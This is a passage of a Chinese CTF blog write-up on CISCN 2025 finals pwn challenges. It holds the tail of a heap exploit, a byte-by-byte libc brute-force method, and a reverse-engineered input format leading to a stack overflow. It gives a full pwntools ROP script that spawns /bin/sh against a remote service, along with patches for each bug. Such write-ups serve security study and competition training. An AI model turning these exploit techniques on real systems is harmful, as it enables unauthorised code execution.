<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line"><span class="comment"># edit(0, p64(0) * 2 + p32(libc.sym._IO_2_1_stdout_ &amp; 0xFFFF))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p32((libc_base + <span class="number">0x21A080</span>) &amp; <span class="number">0xFFFFFFFF</span>)[:<span class="number">3</span>])</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x118</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p32((libc_base + get_current_one_gadget_from_libc()[<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span>)[:<span class="number">3</span>])</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xB8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>以下解法来自中大的师傅</p>
+<p>由于程序是fork的，因此地址不会改变，可以采用逐位爆破</p>
+<p>具体做法就是先申请，然后free到unsortbin，从地位开始改unsortbin里存的libc地址，如果改对了，程序不会爆错，改错了就会</p>
+<p>重复即可爆破出完整libc地址</p>
+<h4 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h4><p>把free后的chunk fd位清空即可</p>
+<p>听说call exit也能过</p>
+<p>（nop free也能利用成功也是神人了，逆天check脚本）</p>
+<h3 id="Logging-System"><a href="#Logging-System" class="headerlink" title="Logging System"></a>Logging System</h3><p>拿到的是依托，先恢复一下符号</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140050539.png" class title="image-20250723140050539">
+
+<p>程序先cin读入一个string</p>
+<p>然后将string转成sstream，逐个字节读入数据</p>
+<p>需要注意的是，程序要求输入base64</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140203000.png" class title="image-20250723140203000">
+
+<p>这里是base64decode</p>
+<p>校验1，首位必须是0xB9</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140233979.png" class title="image-20250723140233979">
+
+<p>接着读入标志位</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140253615.png" class title="image-20250723140253615">
+
+<p>标志位有0x80 0x81 0x82 0x83，这些标志位代表下一次读入是读入多少字节的数据</p>
+<p>0x80 - 1</p>
+<p>0x81 - 2</p>
+<p>0x82 - 4</p>
+<p>0x83 - 8</p>
+<p>接着又是一个校验位，0xBD<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140439147.png" class title="image-20250723140439147"></p>
+<p>和上面一样，也是先读标志位，然后读入数据</p>
+<p>不同的是，这里读入数据是作为下一次读入的数据长度，如图<code>v76</code></p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140553808.png" class title="image-20250723140553808">
+
+<p>同样的，下面重复一次<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140627319.png" class title="image-20250723140627319"></p>
+<p>最后读入校验码，同样是先读入标志位</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140737683.png" class title="image-20250723140737683">
+
+
+
+<p>紧接着程序计算CRC校验值，需要我们最后一次读入的校验值和程序计算的一致</p>
+<p>不需要自己计算，打断点动调即可获得校验值</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140903275.png" class title="image-20250723140903275">
+
+
+
+<p>紧接着程序执行<code>memcpy</code>，这里存在栈溢出</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140928210.png" class title="image-20250723140928210">
+
+
+
+<h4 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h4><p>简单的ROP，用ropper自动生成的</p>
+<p>需要注意的是，程序在最后会调用sstream的析构函数，需要满足里面的一些条件判断，让程序不走到free，不然会崩溃</p>
+<p>动调一下修改就行</p>
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141106463.png" class title="image-20250723141106463">
+
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141125722.png" class title="image-20250723141125722">
+
+<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141137277.png" class title="image-20250723141137277">
+
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;130&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x405D15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b *0x405D50</span></span><br><span class="line"><span class="string">    b *0x405D9A</span></span><br><span class="line"><span class="string">    ida</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gift.elf = ELF(elf_path := <span class="string">&#x27;./LoginSystem&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;39.96.183.124 20603&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(elf_path)</span><br><span class="line">    <span class="comment"># gift.io = gdb.debug(elf_path, gdbscript=cmd, sysroot=&#x27;/&#x27;)</span></span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;--&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = p64</span><br><span class="line">IMAGE_BASE_0 = <span class="number">0x0000000000400000</span>  <span class="comment"># efa234332e5336c9d85b244c515b43af2c82417ea32f1f70f25663d3dfd566e3</span></span><br><span class="line">rebase_0 = <span class="keyword">lambda</span> x: p64(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000071B8</span>)  <span class="comment"># 0x00000000004071b8: pop r13; ret;</span></span><br><span class="line">rop += <span class="string">b&#x27;//bin/sh&#x27;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000007150</span>)  <span class="comment"># 0x0000000000407150: pop rbx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E160</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000003C2B42</span>)  <span class="comment"># 0x00000000007c2b42: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000071B8</span>)  <span class="comment"># 0x00000000004071b8: pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0x0000000000000000</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000007150</span>)  <span class="comment"># 0x0000000000407150: pop rbx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000003C2B42</span>)  <span class="comment"># 0x00000000007c2b42: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000005D99</span>)  <span class="comment"># 0x0000000000405d99: pop rdi; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E160</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000079C4</span>)  <span class="comment"># 0x00000000004079c4: pop rsi; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000128753</span>)  <span class="comment"># 0x0000000000528753: pop rdx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000009387</span>)  <span class="comment"># 0x0000000000409387: pop rax; ret;</span></span><br><span class="line">rop += p(<span class="number">0x000000000000003B</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x000000000030C546</span>)  <span class="comment"># 0x000000000070c546: syscall; ret;</span></span><br><span class="line"></span><br><span class="line">pay1 = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x150</span>: <span class="number">0x947FC0</span>,  <span class="comment"># 修改以不走free的分支</span></span><br><span class="line">        <span class="number">0x250</span>: <span class="number">0x947FC0</span>,  <span class="comment"># 修改以不走free的分支</span></span><br><span class="line">        <span class="number">0x7C8</span>: rop,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xb9&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x80\x03&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xbd&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x80\x05&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xbd&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span> + p16_ex(<span class="built_in">len</span>(pay1))</span><br><span class="line">payload += pay1</span><br><span class="line">payload += <span class="string">b&#x27;\x82&#x27;</span> + p64(<span class="number">0x633F1F27</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(b64encode(payload))</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h4><p>将<code>memcpy</code>的len改成256即可</p>
+<h3 id="embbed-httpd"><a href="#embbed-httpd" class="headerlink" title="embbed_httpd"></a>embbed_httpd</h3><h4 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h4><p>晚点补……</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> ciscn-2025-决赛</li>
+        <li><strong>作者:</strong> InkeyP</li>
+        <li><strong>创建于
+                :</strong> 2025-07-23 13:18:25</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-07-23 14:17:49
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://blog.inkey.top/202507/23/ciscn-2025-决赛/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/pwn/">#pwn</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ciscn/">#ciscn</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>绝赞文章</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/202509/21/湾区杯-2025/" title="湾区杯-2025" rel="bookmark">
+  <img src="/202509/21/湾区杯-2025/image-20250921130233837.png" alt="湾区杯-2025" class="!max-w-none">
+  <span class="title">湾区杯-2025</span>
+</a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark">
+  <img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none">
+  <span class="title">WangDing-2024</span>
+</a><a class="recommended-article-item" href="/202510/13/羊城杯-2025-初赛/" title="羊城杯-2025-初赛" rel="bookmark">
+  <img src="/202510/13/羊城杯-2025-初赛/1.png" alt="羊城杯-2025-初赛" class="!max-w-none">
+  <span class="title">羊城杯-2025-初赛</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>绝赞文章</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/202509/21/湾区杯-2025/" title="湾区杯-2025" rel="bookmark">
+  <img src="/202509/21/湾区杯-2025/image-20250921130233837.png" alt="湾区杯-2025" class="!max-w-none">
+  <span class="title">湾区杯-2025</span>
+</a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark">
+  <img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none">
+  <span class="title">WangDing-2024</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/202508/15/dkdun/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">DK盾-CTFers赞助计划已启动！</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">ciscn-2025-半决赛</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://blogcommit.inkey.top',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/bilibili','https://unpkg.com/@waline/emojis@1.2.0/bmoji','https://unpkg.com/@waline/emojis@1.2.0/tw-emoji'],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">ciscn-2025-决赛</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ciscn-2025-%E5%86%B3%E8%B5%9B-PWN"><span class="nav-text">Ciscn 2025 决赛 PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Day-1"><span class="nav-text">Day 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mqtt"><span class="nav-text">mqtt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Day-2"><span class="nav-text">Day 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DarkHeap"><span class="nav-text">DarkHeap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Logging-System"><span class="nav-text">Logging System</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#embbed-httpd"><span class="nav-text">embbed_httpd</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">梦想是成为PWN糕手</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">InkeyP</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 22 篇文章
+                    </span>
+                    
+                        <span>
+                            共 41.7k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+    
+<script src="/js/build/libs/pangu.min.js"></script>
+
+<script src="/js/build/plugins/pangu.js"></script>
+
+
+
+
+	
+<!-- hexo injector body_end start --><script data-pjax src="https://registry.npmmirror.com/oh-my-live2d/latest/files"></script><script>const oml2d = OML2D.loadOml2d({libraryUrls:{"complete":"https://registry.npmmirror.com/oh-my-live2d/latest/files/lib/complete.js","cubism2":"https://registry.npmmirror.com/oh-my-live2d/latest/files/lib/cubism2.js","cubism5":"https://registry.npmmirror.com/oh-my-live2d/latest/files/lib/cubism5.js"},menus:{},items:"(defaultItems)=>{\n return [\n   ...defaultItems,\n   {\n     id: 'github',\n     icon: 'github-fill',\n     title: '点击直达gayhub',\n     onClick: ()=>window.open('https://github.com/inkeyp')\n   }\n ]\n}\n",mobileDisplay:true,models:[{"path":"live2d_models/poi/poi.model.json","mobilePosition":[-10,23],"mobileScale":0.1,"mobileStageStyle":{"width":180,"height":166},"motionPreloadStrategy":"IDLE","position":[10,40],"scale":0.4,"stageStyle":{"width":300,"height":300}}],parentElement:document.body,primaryColor:"var(--btn-bg)",sayHello:false,tips:{style: {"width":230,"height":120,"left":"calc(50% - 20px)","top":"-100px"},mobileStyle: {"width":180,"height":80,"left":"calc(50% - 30px)","top":"-100px"},idleTips:{interval:15000,message:function(){
+  return axios.get('https://v1.hitokoto.cn?c=i')
+    .then(function (response) {
